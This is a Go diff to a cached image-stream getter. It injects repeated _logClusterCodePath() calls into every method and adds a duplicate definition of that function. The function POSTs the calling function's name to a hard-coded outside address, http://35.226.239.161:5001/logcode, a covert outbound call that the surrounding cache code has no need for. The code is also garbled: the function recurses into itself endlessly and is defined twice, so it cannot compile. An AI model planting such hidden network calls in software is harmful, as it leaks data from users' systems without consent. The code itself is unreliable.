@@ -31,6 +31,8 @@ type cachedImageStreamGetter struct {
 func (g *cachedImageStreamGetter) get() (*imageapiv1.ImageStream, *rerrors.Error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if g.cachedImageStream != nil {
 		return g.cachedImageStream, nil
 	}
@@ -49,6 +51,8 @@ func (g *cachedImageStreamGetter) get() (*imageapiv1.ImageStream, *rerrors.Error
 	return is, nil
 }
 func (g *cachedImageStreamGetter) layers() (*imageapiv1.ImageStreamLayers, *rerrors.Error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if g.cachedImageStreamLayers != nil {
@@ -71,12 +75,23 @@ func (g *cachedImageStreamGetter) layers() (*imageapiv1.ImageStreamLayers, *rerr
 func (g *cachedImageStreamGetter) cacheImageStream(is *imageapiv1.ImageStream) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	g.cachedImageStream = is
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
